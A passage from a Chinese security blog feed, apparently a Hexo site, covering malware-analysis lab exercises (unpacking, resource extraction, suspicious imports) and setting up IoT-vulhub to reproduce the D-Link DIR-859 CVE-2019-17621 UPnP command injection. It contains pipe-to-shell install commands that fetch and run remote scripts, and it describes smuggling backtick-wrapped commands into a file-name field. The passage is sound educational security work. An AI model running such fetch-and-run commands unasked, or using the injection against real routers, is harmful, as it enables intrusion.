class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-02.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. Free UPX</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><p><code>实验二主要的学习目的是学会用UPX脱壳</code>，我这里就不再演示题目中的常规操作了，请大家务必都完成这些题目，因为动手实践和反复练习才能让你飞速的涨经验升级，(就像刷无聊的小怪)</p><h3 id="UPX-脱壳"><a href="#UPX-脱壳" class="headerlink" title="UPX 脱壳"></a>UPX 脱壳</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164040500-323976483.png" alt="image-20210812174252256"> </p><p>脱壳前：</p><p>这里他显示了我们之前说过的<code>Unknow EXE Type</code>，也就是说他无法识别出程序的类型，这里解决的办法是点击深度搜索。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164041681-1206100825.png" alt="image-20210812174419711"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164044297-855807531.png" alt="image-20210812174545293"> </p><p>脱壳后：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164046240-711895784.png" alt="image-20210812174616454"> </p><h2 id="实验三："><a href="#实验三：" class="headerlink" title="实验三："></a>实验三：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-03.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. linxerUnpack</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><p><code>实验三的主要学习目的是学会用linxerUnpack进行通用脱壳</code>，还是希望大家将题目都做完，这里就不演示了。</p><h3 id="通用脱壳机"><a href="#通用脱壳机" class="headerlink" title="通用脱壳机"></a>通用脱壳机</h3><p>查壳：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164049720-956519126.png" alt="image-20210812174843358"> </p><p>脱壳：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164052664-407245817.png" alt="image-20210812174944742"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164053166-1137615638.png" alt="image-20210812175011801"> </p><h2 id="实验四："><a href="#实验四：" class="headerlink" title="实验四："></a>实验四：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-04.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. Restorator</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、这个文件是什么时候被编译的？</span><br><span class="line">4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">5、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">6、这个文件在资源段中包含一个资源，使用Restorator工具来检查资源，然后抽取资源。从资源中你能发现什么吗？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><p><code>实验四的主要学习目的是学会用资源管理器，查看资源</code>，还是希望大家手动将1-6到题目亲手做一遍。</p><h3 id="资源查看器"><a href="#资源查看器" class="headerlink" title="资源查看器"></a>资源查看器</h3><p>在Lab01-04中有个”BIN”的资源，并且文件头是以<code>MZ</code>开头，可以确定他是一个PE文件，我们用右键功能将其导出。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164056184-1521474947.png" alt="image-20210812175358975"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164057602-1335390299.png" alt="image-20210812175545330"> </p><p>导出后发现是一个EXE程序，并且没有加壳。</p><p>接着我们继续来看看他的导入表，发现他有两个比较可疑的api函数</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164115343-2037423307.png" alt="image-20210812175610925"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164058954-919815121.png" alt="image-20210812175739276"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164102403-1446640878.png" alt="image-20210812175805636"> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinExec <span class="comment">//这个api主要是用来进行执行程序、命令操作。</span></span><br><span class="line">URLDwonloadToFile <span class="comment">//这个api是从网络上下载文件并保存到本地的一个操作。</span></span><br><span class="line">    </span><br><span class="line">所以请大家自行去完成他会下载一个什么程序 并且执行呢？</span><br></pre></td></tr></table></figure><h2 id="最后总结："><a href="#最后总结：" class="headerlink" title="最后总结："></a>最后总结：</h2><p>我们分别学习了以下软件或网站</p><ul><li><p><a href="http://www.virscan.org/">www.virscan.org</a> (查杀恶意软件在线网站)</p></li><li><p>StudyPE+ x86       (查壳、查看文件编译时间、查看导入表)</p></li><li><p>Strings.exe            (分析程序中的字符串)</p></li><li><p>Free UPX                (脱UPX壳)</p></li><li><p>linxerUnpacker  (脱通用的壳)</p></li></ul><p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153655993-993042562.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 
我们主要通过以下的四个实验，来学习静态分析的基础技术，请大家务必完成每个实验中题目，这样才能得到有效的水平提升。

&lt;p&gt;实验中的工具或样本都可以在这里下载到：&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战一：专业术语入门知识</title>
    <link href="https://vxer-lee.github.io/2021/08/08/MalwareAnalysis/1.Basic/"/>
    <id>https://vxer-lee.github.io/2021/08/08/MalwareAnalysis/1.Basic/</id>
    <published>2021-08-08T09:58:30.000Z</published>
    <updated>2021-08-16T11:03:23.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="什么是恶意代码分析？"><a href="#什么是恶意代码分析？" class="headerlink" title="什么是恶意代码分析？"></a>什么是恶意代码分析？</h2><p>恶意代码也称为恶意软件:    任何以某种方式对用户、计算机或网络造成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件，等等。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152408070-146731502.png" alt="image-20210812161145164">  </p><h2 id="恶意代码的类型："><a href="#恶意代码的类型：" class="headerlink" title="恶意代码的类型："></a>恶意代码的类型：</h2><p>恶意代码类型种类非常多，这里只列出比较常见的8中类型。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152426134-1255295289.png" alt="image-20210812161210295"> </p><ul><li>后门：病毒在电脑里面潜伏，开一个门方便黑客连进来进行操作。</li><li>僵尸网络：CC攻击，DDOS工具，利用大批量肉鸡 发送指令对指定IP攻击。</li><li>下载器：下载程序，去网络上下载组件或程序到本地。</li><li>间谍软件：偷用户信息，比如键盘记录器，偷密码。</li><li>启动器： （也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码，启动器通常包含一个它要加载的恶意代码。</li><li>内核套件：RootKit，权限相对高，不容易被发现，Ring0层。</li><li>勒索软件：全盘加密文件，非对称加密/对称加密。</li><li>蠕虫：带感染功能，感染exe。 黑客帝国里面的特工史密斯</li></ul><p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153615446-1312770443.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;什么是恶意代码分析？&quot;&gt;&lt;a href=&quot;#什么是恶意代码分析？&quot; class=&quot;headerlink&quot; title=&quot;什么是恶意代码分析？&quot;&gt;&lt;/a&gt;什么是恶意代码分析</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>路由器漏洞环境仿真</title>
    <link href="https://vxer-lee.github.io/2021/08/05/IoTSecurity/IoT-vulhub/"/>
    <id>https://vxer-lee.github.io/2021/08/05/IoTSecurity/IoT-vulhub/</id>
    <published>2021-08-05T02:05:50.000Z</published>
    <updated>2021-08-16T07:58:22.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在研究路由器漏洞，要是每次分析个路由器都要上闲鱼买一个路由器真的费用有点高，所以在网上找了类似的路由器漏洞环境仿真的平台，运气不错在GitHub上找到一个开源项目<a href="https://github.com/firmianay/IoT-vulhub">IoT-vulhub</a>，接下来就是记录自己搭建IoT固件漏洞复现环境的过程。  </p><h2 id="0x01-IoT-vulhub安装"><a href="#0x01-IoT-vulhub安装" class="headerlink" title="0x01 IoT-vulhub安装"></a>0x01 IoT-vulhub安装</h2><h3 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">..............                                  </span><br><span class="line">            ..,;:ccc,.                           kali@kali</span><br><span class="line">          ......&#39;&#39;&#39;;lxO.                         OS: Kali Linux </span><br><span class="line">.....&#39;&#39;&#39;&#39;..........,:ld;                         Kernel: x86_64 Linux 5.5.0-kali2-amd64</span><br><span class="line">           .&#39;;;;:::;,,.x,                        Uptime: 1m</span><br><span class="line">      ..&#39;&#39;&#39;.            0Xxoc:,.  ...            Packages: 2170</span><br><span class="line">  ....                ,ONkc;,;cokOdc&#39;,.          Shell: bash</span><br><span class="line"> .                   OMo           &#39;:ddo.        Resolution: 1688x952</span><br><span class="line">                    dMc               :OO;       DE: Xfce</span><br><span class="line">                    0M.                 .:o.     WM: Xfwm4</span><br><span class="line">                    ;Wd                          WM Theme: Kali-Dark</span><br><span class="line">                     ;XO,                        GTK Theme: Kali-Dark [GTK2]</span><br><span class="line">                       ,d0Odlc;,..               Icon Theme: Flat-Remix-Blue-Dark</span><br><span class="line">                           ..&#39;,;:cdOOd::,.       Font: Cantarell 11</span><br><span class="line">                                    .:d;.&#39;:;.    Disk: 20G &#x2F; 63G (33%)</span><br><span class="line">                                       &#39;d,  .&#39;   CPU: Intel Core i7-6700 @ 2x 3.408GHz</span><br><span class="line">                                         ;l   .. GPU: VMware SVGA II Adapter</span><br><span class="line">                                          .o     RAM: 820MiB &#x2F; 3912MiB</span><br><span class="line">                                            c   </span><br><span class="line">                                            .&#39;  </span><br><span class="line">                                             .  </span><br></pre></td></tr></table></figure><h3 id="安装依赖："><a href="#安装依赖：" class="headerlink" title="安装依赖："></a>安装依赖：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Python3</span></span><br><span class="line"><span class="comment">#这个最好安装Python3.5以上,否则会有问题!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装pip</span></span><br><span class="line">$ curl -s https://bootstrap.pypa.io/get-pip.py | sudo python3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版 docker</span></span><br><span class="line">$ curl -s https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker 服务</span></span><br><span class="line">$ sudo service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的版本信息</span></span><br><span class="line">$ sudo docker version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行hello,world</span></span><br><span class="line">$ sudo docker run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让普通用户也能运行 docker</span></span><br><span class="line">$ sudo usermod -aG docker <span class="variable">$USER</span> <span class="comment">#然后注销用户重新登录即可。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">$ docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装docker-compose,最好用root权限装</span></span><br><span class="line">$ sudo python3 -m pip install docker-compose</span><br></pre></td></tr></table></figure><h3 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#克隆github 项目</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/firmianay/IoT-vulhub.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> IoT-vulhub</span><br></pre></td></tr></table></figure><h3 id="构建Docker基础镜像"><a href="#构建Docker基础镜像" class="headerlink" title="构建Docker基础镜像"></a>构建Docker基础镜像</h3><p><strong>以下为必须构建的镜像</strong></p><ul><li><input checked="" disabled="" type="checkbox"> Ubuntu 16.04系统镜像</li><li><input checked="" disabled="" type="checkbox"> binwalk 以及 noentry版镜像</li><li><input checked="" disabled="" type="checkbox"> firmadyne固件模拟镜像</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞仿真是根据每个镜像综合的利用,所以一定要构建这些镜像</span></span><br><span class="line">----------------------------系统-------------------------------</span><br><span class="line"><span class="comment"># 构建Ubuntu 16.04系统</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/ubuntu1604 &amp;&amp; docker build -t firmianay/ubuntu1604 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建binwalk容器,解压固件 和仿真用</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/binwalk &amp;&amp; docker build -t firmianay/binwalk .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建noentry版本的binwalk镜像, firmadyne 基于该版本镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/binwalk &amp;&amp; vi Dockerfile (修改如下,注释ENTRYPOINT)</span><br><span class="line"><span class="comment">#ENTRYPOINT [&quot;binwalk&quot;]</span></span><br><span class="line">$ docker build -t firmianay/binwalk:noentry .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建firmadyne 模拟镜像</span></span><br><span class="line">$  <span class="built_in">cd</span> baseImage/firmadyne &amp;&amp; docker build -t firmianay/firmadyne .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建firmae 模拟镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/firmAE &amp;&amp; docker build -t firmianay/firmae .</span><br><span class="line"></span><br><span class="line">-----------------------------工具------------------------------</span><br><span class="line"><span class="comment"># 构建buildroot</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/buildroot &amp;&amp; docker build -t firmianay/buildroot .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建busybox</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/busybox &amp;&amp; docker build -t firmianay/busybox .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建gdbserver</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/gdbserver &amp;&amp; docker build -t firmianay/gdbserver .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建QEMU 用户级模拟镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/qemu-user-static &amp;&amp; docker build -t firmianay/qemu-user-static .</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144213115-325660259.png" alt="1"> </p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="模拟D-Link-DIR-859固件"><a href="#模拟D-Link-DIR-859固件" class="headerlink" title="模拟D-Link DIR-859固件"></a>模拟D-Link DIR-859固件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入到D-Link\CVE2019-17621目录</span></span><br><span class="line"><span class="built_in">cd</span> D-Link/CVE-2019-17621/</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压D-Link DIR-859固件</span></span><br><span class="line">$ docker run --rm -v <span class="variable">$PWD</span>/firmware/:/root/firmware firmianay/binwalk -Mer <span class="string">&quot;/root/firmware/DIR822A1_FW103WWb03.bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建漏洞环境镜像</span></span><br><span class="line">$ sudo docker-compose -f docker-compose-firmadyne.yml build</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动模拟好的D-Link DIR-859漏洞环境 docker容器</span></span><br><span class="line">$ sudo docker-compose -f docker-compose-firmadyne.yml up</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用ssh开启socks代理,将漏洞环境网络代理出来,方便虚拟机操作</span></span><br><span class="line">$ ssh -D 2345 root@127.0.0.1 -p 1234 <span class="comment">#密码root</span></span><br><span class="line"><span class="comment">#开启socks代理</span></span><br><span class="line"><span class="comment">#代理端口:2345</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Google浏览器中安装Proxy SwitchyOmega插件，配置如下代理</span></span><br><span class="line">代理协议:SOCKS5</span><br><span class="line">代理服务器:127.0.0.1</span><br><span class="line">代理端口:2345 </span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144222243-307300690.png" alt="2"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144240991-1819902602.png" alt="3"> </p><h3 id="CVE-2019-17621-命令注入漏洞-分析"><a href="#CVE-2019-17621-命令注入漏洞-分析" class="headerlink" title="CVE-2019-17621 (命令注入漏洞)分析"></a>CVE-2019-17621 (命令注入漏洞)分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line">DIR-859路由器用了UPNP协议，并且在某处调用fwrite()向文件中添加删除命令&#96;rm -f &quot;.$shell_file.&quot;\n&quot;&#96;,</span><br><span class="line">时候出现了漏洞，我们可以将shell_file内容改为反引号包裹的系统命令，来利用命令注入漏洞执行命令。</span><br></pre></td></tr></table></figure><h4 id="UPNP协议简介"><a href="#UPNP协议简介" class="headerlink" title="UPNP协议简介:"></a>UPNP协议简介:</h4><p>UPnP全名是Universal Plug and Play，主要是微软在推行的一个标准。</br><br>简单的来说，UPnP 最大的愿景就是希望任何设备只要一接上网络，所有在网络上的设备马上就能知道有新设备加入，这些设备彼此之间能互相沟通，更能直接使用或控制它，一切都不需要设定，完全的Plug and Play。</p><ul><li>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。</br></li><li>同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。</br></li><li>构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。</br></li><li>对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。</li></ul><h4 id="漏洞所在位置"><a href="#漏洞所在位置" class="headerlink" title="漏洞所在位置:"></a>漏洞所在位置:</h4><p>二进制可执行文件<code>/htdocs/cgibin</code>中的<code>genacgi_main()</code>函数包含了可远程执行代码的漏洞。</br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">genacgi_main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">............</span><br><span class="line">  iVar7 = (**(code **)(local_18 + <span class="number">-0x7d44</span>))(iVar6,<span class="string">&quot;?service=&quot;</span>,<span class="number">9</span>);<span class="comment">//iVar6 ?service= </span></span><br><span class="line">  <span class="keyword">if</span> (iVar7 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar7 = (**(code **)(local_18 + <span class="number">-0x7d30</span>))(pcVar4,<span class="string">&quot;SUBSCRIBE&quot;</span>);</span><br><span class="line">  uri_service = iVar6 + <span class="number">9</span>;<span class="comment">//uri_service 来自 iVar6</span></span><br><span class="line">..........</span><br><span 